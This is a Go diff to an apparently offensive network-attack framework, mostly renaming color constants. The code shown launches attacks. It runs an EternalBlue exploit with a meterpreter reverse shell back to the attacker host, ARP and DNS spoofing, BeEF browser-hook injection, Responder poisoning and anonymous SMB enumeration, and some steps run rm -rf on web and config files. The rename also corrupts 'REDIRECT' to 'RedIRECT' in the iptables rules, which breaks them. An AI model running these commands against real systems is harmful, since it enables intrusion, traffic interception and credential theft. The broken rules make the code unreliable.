@@ -52,7 +52,8 @@ var defaultValues = map[string]string{
 
 func NetworksPentest() {
     for {
-        fmt.Printf("%s%safr3%s networks(%ssrc/pentest_%s.fn%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, Function, bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
+        
+        fmt.Printf("%s%safr3%s networks(%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Red, Function, bcolors.Endc, bcolors.Green, bcolors.Endc)
         scanner.Scan()
         Input = strings.TrimSpace(scanner.Text())
         buildParts := strings.Fields(strings.ToLower(Input))
@@ -533,7 +534,7 @@ func handleUnsetCommand(parts []string) {
 
 func executeFunction() {
     if Function == ""{
-        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
     NetworkPenFunctions(Function, Iface, Gateway, Lhost, Rhost, Mode, FakeDns, Spoofer)
@@ -575,119 +576,119 @@ func NetworkPenFunctions(Function string, args ...interface{}) {
     if action, exists := commands[Function]; exists {
         action()
     } else {
-        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.YELLOW, bcolors.ENDC, Function, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
     }
 }
 
 func IpNeighbour() {
-    fmt.Printf("\n\n%s[>] %sDiscovering connected devices ...\n", bcolors.GREEN, bcolors.ENDC)
+    fmt.Printf("\n\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
     subprocess.Popen(`ip -h -s -d -a -c=auto -t neighbour`)
     return
 }
 
 func NaabuPortScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`naabu -host %s`, Rhost)
     return
 }
 
 func NmapPortScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, Rhost)
     return
 }
 
 func NmapVulnScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %svuln scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %svuln scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, Rhost)
     return
 }
 
 func SmbVulnScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sSMB vuln scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sSMB vuln scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, Rhost)
     return
 }
 
 func Enum4linux(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
     return
 }
 
 func EnumNxc(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, Rhost)
     return
 }
 
 func SmbMapScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, Rhost, Rhost)
     return
 }
 
 func RpcEnumScan(Rhost string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sperforming rpc recon target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sperforming rpc recon target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`rpcclient -U "" -N %s`, Rhost)
     return
 }
 
 func XssHooker(Rhost string) {
-    fmt.Printf("\n\n%s[>] %sperforming M.I.B attacks: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sperforming M.I.B attacks: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, ToolsDir, Lhost, CertPath, KeyPath, "443")
     return
 }
 
 func SmbExploit(Rhost string, Lhost string, Lport string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sexploiting smb on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
+    fmt.Printf("\n\n%s[>] %sexploiting smb on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
     fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n\n", Rhost, Lhost, Lport)
     subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, Rhost, Lhost, Lport)
 }
 
 func PacketSniffer(Mode string, Rhost string) {
     if _, err := exec.LookPath("bettercap"); err != nil {
-        fmt.Printf("\n%s[!] %sBettercap isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.RED, bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sBettercap isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
     switch strings.ToLower(Mode) {
@@ -698,7 +699,7 @@ func PacketSniffer(Mode string, Rhost string) {
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
         subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Red, Mode, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 }
@@ -706,7 +707,7 @@ func PacketSniffer(Mode string, Rhost string) {
 func KillerResponder(Iface string, Lhost string) {
     filePath := "/etc/responder/Responder.conf.bak_africana"
     if _, err := exec.LookPath("responder"); err != nil {
-        fmt.Printf("\n%s[!] %sResponder isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.RED, bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sResponder isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
@@ -732,7 +733,7 @@ func KillerResponder(Iface string, Lhost string) {
 
 func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
     switch strings.ToLower(Mode) {
@@ -773,10 +774,10 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
                     "/etc/ettercap/etter.conf": {
                         `ec_uid = 65534`: `ec_uid = 0`,
                         `ec_gid = 65534`: `ec_gid = 0`,
-                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                     },
                 }
             utils.Editors(filesToReplacements)
@@ -809,7 +810,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
+            fmt.Print(bcolors.Blue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
@@ -854,10 +855,10 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
                     "/etc/ettercap/etter.conf": {
                         `ec_uid = 65534`: `ec_uid = 0`,
                         `ec_gid = 65534`: `ec_gid = 0`,
-                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
+                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                     },
                 }
             utils.Editors(filesToReplacements)
@@ -889,7 +890,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
+            fmt.Print(bcolors.Blue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
@@ -898,14 +899,14 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Red, Mode, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 }
 
 func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
     if Rhost == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 
@@ -952,7 +953,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
+            fmt.Print(bcolors.Blue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
             subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, Lhost, Iface, Rhost)
@@ -962,7 +963,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
     case "all":
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
         if _, err := exec.LookPath("beef-xss"); err != nil {
-            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
+            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.Red, bcolors.Endc)
             return
         }
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
@@ -1006,7 +1007,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
+            fmt.Print(bcolors.Blue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
@@ -1015,14 +1016,14 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Red, Mode, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 }
 
 func BeefInjector(Spoofer string, Mode string, Lhost string, Rhost string, Iface string, Passwd string, FakeDns string, Gateway string) {
     if Spoofer == "" {
-        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 
@@ -1032,7 +1033,7 @@ func BeefInjector(Spoofer string, Mode string, Lhost string, Rhost string, Iface
     case "bettercap":
         BeefBettercap(Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Spoofer, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
+        fmt.Printf("\n%s[!] %sInvalid required parameters Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Red, Spoofer, bcolors.Endc, bcolors.Green, bcolors.Endc)
         return
     }
 }
